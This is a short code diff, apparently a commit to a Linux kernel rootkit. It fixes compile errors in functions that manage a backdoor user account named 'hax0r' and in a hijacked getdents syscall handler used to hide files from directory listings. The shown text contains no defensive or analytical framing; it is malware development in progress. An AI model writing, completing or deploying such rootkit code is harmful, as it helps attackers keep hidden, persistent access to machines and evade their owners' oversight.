@@ -123,8 +123,6 @@ void create_backdoor_user(void)
  */
 void remove_backdoor_user(void)
 {
-    vol_disable_h = 1;
-
     char *envp[] = {"HOME=/", NULL};
     char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};
 
@@ -140,10 +138,10 @@ void remove_backdoor_user(void)
 
 struct file * file_open(const char * path, int flags, int rights) {
 	int err = 0;
-	struct file *filp = NULL
+	struct file *filp = NULL;
 		
 	mm_segment_t oldfs;
-	
+       	
 	oldfs = get_fs();
 	set_fs(get_ds());
 	filp = filp_open(path, flags, rights);
@@ -261,7 +259,7 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 	unsigned short p_dirent_len;
 	char buf[BUF_SIZE], filename[128];
 	struct file *f;
-	struct linux_dirent64 *p_dirp, *prev;
+	struct linux_dirent *p_dirp, *prev;
 	while( offset < nread) {
 		p_dirp = (void *) mod_dirp + offset;
 		p_dirent_len = p_dirp->d_reclen;
